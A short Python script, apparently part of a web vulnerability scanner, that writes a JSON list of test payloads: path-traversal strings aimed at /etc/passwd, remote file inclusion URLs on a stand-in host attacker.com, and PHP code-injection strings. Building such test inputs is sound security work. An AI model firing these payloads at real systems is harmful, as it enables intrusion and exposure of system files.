import json


payload = {"LFI1": "../../../../../../../../../../../../../../etc/passwd",
	"LFI2": "../../../../../../../../../../../../../../lfi.php",
    "LFI3": "../../../../../../../../../../../../../lfi.php",
  	"LFI4": "../../../../../../../../../../../../../../lfi",
	"RFI1": "http://attacker.com/a.php",
    "RFI2": "http://attacker.com/a.js",
    "RFI3": "http://attacker.com/a",
	"PHP1": ";phpinfo()",
    "PHP2": "phpinfo()",
    "PHP3": ";echo \"afadsfaefasdfafezdfa\"",
    "PHP4": "echo \"afadsfaefasdfafezdfa\""}

with open("../output/phase2_output.json", "w") as outfile:
    json.dump({'payloads':payload}, outfile, indent=2)
